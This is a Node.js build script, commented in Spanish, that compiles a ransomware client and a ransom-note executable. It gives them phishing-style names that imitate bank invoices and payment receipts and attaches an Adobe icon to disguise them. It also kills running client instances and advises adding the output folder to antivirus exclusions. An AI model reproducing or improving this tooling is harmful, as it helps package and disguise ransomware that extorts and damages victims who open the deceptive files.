const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

const distDir = path.join(__dirname, 'dist');

// Ensure dist directory exists
if (!fs.existsSync(distDir)) {
    fs.mkdirSync(distDir, { recursive: true });
}

// Function to try to delete a file safely
function tryDelete(filename) {
    const filePath = path.join(distDir, filename);
    if (!fs.existsSync(filePath)) return true;
    try {
        fs.unlinkSync(filePath);
        return true;
    } catch (e) {
        return false;
    }
}

// Function to attempt build
function runBuild(filename) {
    console.log(`\n🔄 Intentando compilar a dist/${filename}...`);

    // 1. Clean up potential previous file
    if (!tryDelete(filename)) {
        console.log(`⚠️  No se pudo borrar ${filename} (Bloqueado/En uso). Saltando...`);
        return false;
    }

    // 2. Run pkg (Client)
    try {
        console.log(`   [NODE] Compilando Cliente...`);
        execSync(`pkg cliente.js --targets node18-win-x64 --output dist/${filename}`, { stdio: 'inherit' });
    } catch (e) {
        console.log(`   [NODE] Fallo la compilacion del cliente. Bloqueado?`);
        return false;
    }

    // 3. Run PyInstaller (Ransom Note)
    const noteName = 'Comprobante_Pago_2026.exe';

    // Always recompile if we want to ensure the icon is applied
    if (true) {
        try {
            // Usar icono si existe (.ico preferido) - RUTA ABSOLUTA REQUERIDA
            const iconRef = 'adobe_icon.ico';
            const iconAbsPath = path.resolve(__dirname, iconRef);
            const iconArg = fs.existsSync(iconRef) ? `--icon="${iconAbsPath}"` : '';

            // USAR VERSION TKINTER (compatible con Windows 7/8/10/11)
            const pyScript = fs.existsSync('interfazdeaviso_tk.py') ? 'interfazdeaviso_tk.py' : 'interfazdeaviso.py';
            console.log(`   [PYTHON] Compilando Nota de Rescate (${noteName}) con ${pyScript}...`);

            // Intento 1: Usar via modulo (evita problemas de PATH)
            execSync(`python -m PyInstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work --specpath build/py_spec --name "${noteName.replace('.exe', '')}" ${pyScript}`, { stdio: 'inherit' });
            console.log(`   [PYTHON] Nota compilada con exito.`);
        } catch (e) {
            const iconRef = 'adobe_icon.ico';
            const iconAbsPath = path.resolve(__dirname, iconRef);
            const iconArg = fs.existsSync(iconRef) ? `--icon="${iconAbsPath}"` : '';
            const pyScript = fs.existsSync('interfazdeaviso_tk.py') ? 'interfazdeaviso_tk.py' : 'interfazdeaviso.py';

            console.log(`   [PYTHON] Modulo fallito. Intentando comando global 'pyinstaller'...`);
            try {
                // Intento 2: Comando directo
                execSync(`pyinstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work --specpath build/py_spec --name "${noteName.replace('.exe', '')}" ${pyScript}`, { stdio: 'inherit' });
                console.log(`   [PYTHON] Nota compilada con exito.`);
            } catch (err) {
                console.log(`   [PYTHON] Advertencia: No se pudo compilar la nota.`);
            }
        }
    } else {
        // Unreachable but keeping structure if needed later
    }

    // Copiar recursos adicionales a dist/
    const recursos = ['escudo.png', 'adobe_icon.ico', 'adobe_icon.png'];
    for (const recurso of recursos) {
        if (fs.existsSync(recurso)) {
            try {
                fs.copyFileSync(recurso, path.join(distDir, recurso));
                console.log(`   [RECURSO] ${recurso} copiado a dist/`);
            } catch (e) {
                // Ignorar errores de copia
            }
        }
    }

    console.log(`\n EXCELENTE! Artefactos generados en dist/`);
    return true;
}

// Main logic
console.log(' Iniciando proceso de construccion inteligente...');

// Kill any stuck instances first
try {
    execSync('taskkill /F /IM cliente.exe', { stdio: 'ignore' });
} catch (e) { }

// List of preferred names to try in order (bank invoice style 2026)
const candidates = ['Factura_Electronica_Enero2026.exe', 'Estado_Cuenta_2026.exe', 'Comprobante_Bancario_2026.exe'];
let built = false;

// Try candidates
for (const name of candidates) {
    if (runBuild(name)) {
        built = true;
        break;
    }
}

// Fallback to timestamp if all else fails
if (!built) {
    const timestampName = `cliente_${Date.now()}.exe`;
    console.log(`\n⚠️  Nombres estandar bloqueados. Probando nombre unico: ${timestampName}`);
    if (runBuild(timestampName)) {
        built = true;
    }
}

if (!built) {
    console.error('\n💥 Todas las intentos de compilacion fallaron.');
    console.error('💡 SUGERENCIA: Agrega la carpeta "dist" a las exclusiones de tu Antivirus.');
    process.exit(1);
}
